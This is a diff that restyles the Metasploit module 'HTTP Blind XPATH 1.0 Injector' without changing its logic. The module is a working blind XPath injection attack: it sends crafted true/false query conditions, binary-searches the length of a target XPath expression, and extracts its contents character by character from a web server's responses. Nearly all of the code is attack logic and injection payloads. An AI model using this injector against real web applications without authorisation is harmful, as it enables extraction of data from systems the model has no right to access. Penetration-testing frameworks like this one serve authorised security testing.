@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,44 +7,41 @@
 require 'rex/proto/http'
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::WmapScanDir
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'   		=> 'HTTP Blind XPATH 1.0 Injector',
-      'Description'	=> %q{
-        This module exploits blind XPATH 1.0 injections over HTTP GET requests.
-      },
-      'Author' 		=> [ 'et [at] metasploit . com' ],
-      'License'		=> BSD_LICENSE))
+                      'Name' => 'HTTP Blind XPATH 1.0 Injector',
+                      'Description'	=> %q(
+                        This module exploits blind XPATH 1.0 injections over HTTP GET requests.
+                      ),
+                      'Author' 		=> [ 'et [at] metasploit . com' ],
+                      'License'		=> BSD_LICENSE))
 
     register_options(
       [
-        OptString.new('METHOD', [ true, "HTTP Method",'GET']),
-        OptString.new('PATH', [ true,  "The URI Path", '/vulnerable.asp']),
-        OptString.new('PRE_QUERY', [ true,  "Pre-injection HTTP URI Query", 'p1=v1&p2=v2&p3=v3']),
-        OptString.new('POST_QUERY', [ false,  "Post-injection HTTP URI Query", ' ']),
+        OptString.new('METHOD', [ true, "HTTP Method", 'GET']),
+        OptString.new('PATH', [ true, "The URI Path", '/vulnerable.asp']),
+        OptString.new('PRE_QUERY', [ true, "Pre-injection HTTP URI Query", 'p1=v1&p2=v2&p3=v3']),
+        OptString.new('POST_QUERY', [ false, "Post-injection HTTP URI Query", ' ']),
         OptString.new('ERROR_MSG', [ true, "False error message", 'Server Error']),
         OptString.new('XCOMMAND', [ false, "XPath command to execute (Default for all XML doc)", '//*']),
         OptInt.new('MAX_LEN', [ true, "Maximum string length", 20000]),
         OptBool.new('MAX_OVER', [ true, "Dont detect result size. Use MAX_LEN instead", true ]),
         OptBool.new('CHKINJ', [ false, "Check XPath injection with error message", false ]),
         OptBool.new('DEBUG_INJ', [ false, "Debug XPath injection", true ])
-      ], self.class)
-
+      ], self.class
+    )
   end
 
   def wmap_enabled
     false
   end
 
-  def run_host(ip)
-
+  def run_host(_ip)
     #
     # Max string len
     #
@@ -51,11 +49,11 @@ class MetasploitModule < Msf::Auxiliary
 
     conn = true
 
-    rnum=rand(10000)
+    rnum = rand(10000)
 
     # Weird crap only lower case 'and' operand works
     truecond = "'%20and%20'#{rnum}'='#{rnum}"
-    falsecond = "'%20and%20'#{rnum}'='#{rnum+1}"
+    falsecond = "'%20and%20'#{rnum}'='#{rnum + 1}"
 
     hmeth = datastore['METHOD']
     tpath = normalize_uri(datastore['PATH'])
@@ -63,8 +61,6 @@ class MetasploitModule < Msf::Auxiliary
     postquery = datastore['POST_QUERY']
     emesg = datastore['ERROR_MSG']
     xcomm = datastore['XCOMMAND']
-
-
 
     print_status("Initializing injection.")
 
@@ -76,12 +72,12 @@ class MetasploitModule < Msf::Auxiliary
 
       begin
         res = send_request_cgi({
-          'uri'  		=>  tpath,
-          'query'     =>  "#{prequery}#{falsecond}#{postquery}",
-          'method'   	=>	hmeth
-        }, 20)
+                                 'uri' => tpath,
+                                 'query' => "#{prequery}#{falsecond}#{postquery}",
+                                 'method' => hmeth
+                               }, 20)
 
-        return if not res
+        return unless res
 
         if res.body.index(emesg)
           print_status("False statement check done.")
@@ -100,12 +96,12 @@ class MetasploitModule < Msf::Auxiliary
 
       begin
         res = send_request_cgi({
-          'uri'  		=>  tpath,
-          'query'     =>  "#{prequery}#{truecond}#{postquery}",
-          'method'   	=>	hmeth
-        }, 20)
+                                 'uri' => tpath,
+                                 'query' => "#{prequery}#{truecond}#{postquery}",
+                                 'method' => hmeth
+                               }, 20)
 
-        return if not res
+        return unless res
 
         if res.body.index(emesg)
           print_error("Error message included in true condition.")
@@ -118,7 +114,7 @@ class MetasploitModule < Msf::Auxiliary
       rescue ::Timeout::Error, ::Errno::EPIPE
       end
 
-      return if not conn
+      return unless conn
     end
 
     #
@@ -134,8 +130,8 @@ class MetasploitModule < Msf::Auxiliary
     else
       lenfound = false
 
-      while !lenfound do
-        middle = (low + high) / 2;
+      until lenfound
+        middle = (low + high) / 2
 
         if datastore['DEBUG_INJ']
           print_status("Length Low: #{low} High: #{high} Med: #{middle}")
@@ -145,12 +141,12 @@ class MetasploitModule < Msf::Auxiliary
 
         begin
           res = send_request_cgi({
-            'uri'  		=>  tpath,
-            'query'     =>  "#{prequery}#{injlen}#{postquery}",
-            'method'   	=>	hmeth
-          }, 20)
+                                   'uri' => tpath,
+                                   'query' => "#{prequery}#{injlen}#{postquery}",
+                                   'method' => hmeth
+                                 }, 20)
 
-          return if not res
+          return unless res
 
           if res.body.index(emesg)
             lenf = false
@@ -164,27 +160,26 @@ class MetasploitModule < Msf::Auxiliary
         rescue ::Timeout::Error, ::Errno::EPIPE
         end
 
-        if !lenf
-          injlen = "'%20and%20string-length(#{xcomm})<#{middle}%20and%20'#{rnum}'='#{rnum}"
+        next if lenf
+        injlen = "'%20and%20string-length(#{xcomm})<#{middle}%20and%20'#{rnum}'='#{rnum}"
 
-          begin
-            res = send_request_cgi({
-              'uri'  		=>  tpath,
-              'query'     =>  "#{prequery}#{injlen}#{postquery}",
-              'method'   	=>	hmeth
-            }, 20)
+        begin
+          res = send_request_cgi({
+                                   'uri' => tpath,
+                                   'query' => "#{prequery}#{injlen}#{postquery}",
+                                   'method' => hmeth
+                                 }, 20)
 
-            return if not res
+          return unless res
 
-            if res.body.index(emesg)
-              low = middle
-            else
-              high = middle
-            end
-          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-            conn = false
-          rescue ::Timeout::Error, ::Errno::EPIPE
+          if res.body.index(emesg)
+            low = middle
+          else
+            high = middle
           end
+        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+          conn = false
+        rescue ::Timeout::Error, ::Errno::EPIPE
         end
       end
 
@@ -204,7 +199,7 @@ class MetasploitModule < Msf::Auxiliary
       # Only alpha range
       #
       for k in (32..126)
-        j = "%"+("%x" % k)
+        j = "%" + ("%x" % k)
 
         # For Xpath 2.0 Blind search may be performed using a fast binary search using the
         # string-to-codepoints(string) function
@@ -215,28 +210,28 @@ class MetasploitModule < Msf::Auxiliary
 
         begin
           res = send_request_cgi({
-            'uri'  		=>  tpath,
-            'query'     =>  "#{prequery}#{injlen}#{postquery}",
-            'method'   	=>	hmeth
-          }, 20)
+                                   'uri' => tpath,
+                                   'query' => "#{prequery}#{injlen}#{postquery}",
+                                   'method' => hmeth
+                                 }, 20)
 
-          return if not res
+          return unless res
 
           if res.body.index(emesg)
             # neeeeext
           else
-            if(numchr >= maxstr)
+            if numchr >= maxstr
               # maximum limit reached
               print_status("#{xcomm}: #{namestr}")
               print_status("Maximum string length reached.")
               return
             end
 
-            numchr+=1
+            numchr += 1
 
             comperc = (numchr * 100) / maxstr
 
-            namestr << "#{k.chr}"
+            namestr << k.chr.to_s
             if datastore['DEBUG_INJ']
               print_status("#{comperc}%: '#{k.chr}' #{namestr}")
             end
